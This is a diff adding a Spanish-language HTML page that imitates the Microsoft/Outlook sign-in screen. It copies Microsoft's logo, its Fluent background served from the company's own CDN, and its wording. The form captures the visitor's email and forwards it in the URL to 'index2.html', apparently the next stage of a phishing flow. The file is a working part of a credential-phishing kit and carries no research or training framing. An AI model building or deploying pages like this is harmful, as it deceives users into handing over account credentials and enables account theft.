@@ -1,0 +1,64 @@
+<!doctype html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iniciar sesión en tu cuenta de Microsoft</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            /* Aplicando tu imagen de fondo Fluent */
+            background: url('https://logincdn.msftauth.net/shared/5/images/fluent_web_light_2_145a07dcb971527a82b8.svg') no-repeat center center fixed;
+            background-size: cover;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+        .ms-card {
+            background: rgba(255, 255, 255, 1);
+            max-width: 440px;
+            width: 100%;
+            padding: 44px;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+            position: relative;
+        }
+    </style>
+</head>
+<body>
+    <div class="ms-card">
+        <div class="mb-4">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/9/96/Microsoft_logo_%282012%29.svg" alt="Microsoft" class="h-6">
+        </div>
+        
+        <h1 class="text-2xl font-semibold text-[#1b1b1b] mb-1">Iniciar sesión</h1>
+        <p class="text-[15px] mb-4">Ir a Outlook</p>
+        
+        <form onsubmit="nextStep(event)">
+            <input type="email" id="email" placeholder="Correo electrónico, teléfono o Skype" 
+                   class="w-full border-b border-gray-400 py-2 focus:outline-none focus:border-[#0067b8] mb-4 text-[15px] transition-all" required>
+            
+            <div class="text-[13px] mb-8">
+                ¿No tiene una cuenta? <a href="#" class="text-[#0067b8] hover:underline">Cree una.</a>
+            </div>
+            
+            <div class="flex justify-end gap-2">
+                <button type="submit" class="bg-[#0067b8] text-white px-9 py-1.5 hover:bg-[#005da6] transition-colors text-[15px]">
+                    Siguiente
+                </button>
+            </div>
+        </form>
+    </div>
+
+    <script>
+        function nextStep(e) {
+            e.preventDefault();
+            const email = document.getElementById('email').value;
+            // Codifica el email para que pase correctamente por la URL a index2.html
+            window.location.href = `index2.html?email=${encodeURIComponent(email)}`;
+        }
+    </script>
+</body>
+</html>
